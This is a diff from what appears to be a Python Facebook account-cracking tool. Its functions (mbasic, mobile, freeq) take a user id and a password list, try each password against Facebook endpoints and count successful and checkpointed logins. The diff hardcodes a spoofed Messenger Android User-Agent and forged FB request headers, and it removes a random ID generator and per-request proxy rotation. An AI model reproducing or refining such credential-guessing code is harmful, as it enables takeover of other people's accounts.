@@ -1310,7 +1310,7 @@ def mbasic(uid,pwx,tl):
                 'x-fb-privacy-context': '3643298472347298',
                 'x-graphql-request-purpose': 'fetch',
                 'x-fb-device-group': '5530',
-                'User-Agent': x1(),
+                'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 9; SM-G960N Build/PQ3A.190605.03171033) [FBAN/Orca-Android;FBAV/500.1.0.71.108;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/713721466;FBCR/PSN;FBMF/samsung;FBBD/samsung;FBDV/SM-G960N;FBSV/9;FBCA/x86_64:arm64-v8a;FBDM/{density=2.0,width=900,height=1600};FB_FW/1;]",
                 'x-fb-connection-type': 'WIFI',
                 'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
                 'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
@@ -1983,13 +1983,6 @@ def mobile(uid,pwx,tl):
         print({error})
         pass
 
-def generate_id():
-    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-    username_id = f"{prefix}:{random.randint(60, 90)}"
-    password_id = f"{prefix}:{random.randint(91, 120)}"
-    return username_id, password_id
-username_id, password_id = generate_id()
-
 def freeq(uid,pwx,tl):
     global oks
     global cps
@@ -2000,8 +1993,6 @@ def freeq(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com').text
             data = {
